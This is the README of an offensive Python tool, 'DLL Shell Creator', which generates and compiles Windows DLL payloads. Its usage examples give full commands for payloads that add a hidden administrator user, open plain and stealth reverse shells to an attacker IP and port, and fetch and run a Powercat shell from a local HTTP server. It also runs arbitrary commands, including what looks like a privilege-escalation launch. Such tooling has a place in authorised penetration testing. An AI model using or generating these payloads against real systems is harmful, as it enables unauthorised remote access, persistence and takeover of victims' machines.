# DLL Shell Creator

## Introduction

The DLL Shell Creator is a Python tool designed to automate the generation of C++ code for dynamic-link libraries (DLLs) that contain various payloads. This tool can be used to generate DLLs for creating reverse shells, adding users, executing custom commands, and more. Additionally, the script provides an option to compile the generated C++ code directly into a DLL using `mingw-w64`.

## Setting Up the Development Environment

### Tools Required:

- **Python 3.x**: Required to run the script.
- **MinGW-w64**: A cross-compiler for Windows, used to compile the generated C++ code into a DLL.
- **Python Libraries**: The script requires `argparse` and `termcolor` libraries.
- **PowerCat.ps1:** Required for powercat based reverse shell

### Installing Python Dependencies

Install the necessary Python dependencies using pip:

```bash
pip install argparse termcolor
```

### Installing MinGW-w64

#### Ubuntu/Debian:

```bash
sudo apt-get install mingw-w64
```

#### Arch Linux:

```bash
sudo pacman -S mingw-w64-gcc
```

#### Windows:

You can download and install `mingw-w64` from [Mingw-w64 SourceForge](https://sourceforge.net/projects/mingw-w64/).

## Usage

### General Command Syntax

To use the DLL Shell Creator, execute the following command:

```bash
python3 dll-shell-creator.py --type <payload_type> [options]
```

### Available Payload Types

#### Add a User to the System

This payload generates a DLL that adds a new user to the system and assigns the user to the administrators group.

   **Command:**
```bash
python3 dll-shell-creator.py --type add_user --username <username> --password <password> --output AddUserDLL
```

   **Example:**
```bash
python3 dll-shell-creator.py --type add_user --username admin --password pass123 --output AddUserDLL
```

#### Generate a Reverse Shell DLL

This payload generates a DLL that initiates a reverse shell to a specified IP address and port.

   **Command:**
```bash
python3 dll-shell-creator.py --type reverse_shell --ip <target_ip> --port <target_port> --output ReverseShellDLL
```

   **Example:**
```bash
python3 dll-shell-creator.py --type reverse_shell --ip 192.168.1.10 --port 4444 --output ReverseShellDLL
   ```

#### Generate a Stealth Reverse Shell DLL

This payload generates a DLL that initiates a hidden reverse shell to a specified IP address and port.

   **Command:**
```bash
python3 dll-shell-creator.py --type stealth_reverse_shell --ip <target_ip> --port <target_port> --output StealthShellDLL
   ```

   **Example:**
```bash
python3 dll-shell-creator.py --type stealth_reverse_shell --ip 192.168.1.10 --port 4444 --output StealthShellDLL
   ```

#### Generate a Powercat-based Reverse Shell DLL

This payload generates a DLL that downloads and executes a Powercat-based reverse shell. Ensure `powercat.ps1` is in the same directory and start an HTTP server to serve the file.

   **Setup:**
```bash
git clone https://github.com/besimorhino/powercat
```

```bash
python3 -m http.server 80
```

   **Command:**
```bash
python3 dll-shell-creator.py --type powercat --ip <target_ip> --port <target_port> --output PowercatShellDLL
```

   **Example:**
```bash
python3 dll-shell-creator.py --type powercat --ip 192.168.119.3 --port 4444 --output PowercatShellDLL
```

#### Execute a Custom Command

   This payload generates a DLL that executes a specified command on the target system.

   **Command:**
```bash
python3 dll-shell-creator.py --type execute_command --command '<your_command>' --output CustomCommandDLL
```

   **Example:**
```bash
python3 dll-shell-creator.py --type execute_command --command 'c:\\users\\public\\downloads\\myfile.exe -t s4u -p cmd.exe -a \\"/c start cmd.exe\\"' --output CustomCommandDLL
```

### Compilation Option

To compile the generated C++ code into a DLL immediately, use the `--compile` flag. If the compilation is successful, the source `.cpp` file will be deleted automatically.

**Example:**
```bash
python3 dll-shell-creator.py --type reverse_shell --ip 192.168.1.10 --port 4444 --output ReverseShellDLL --compile
```

## License

This tool is intended for educational and testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test.

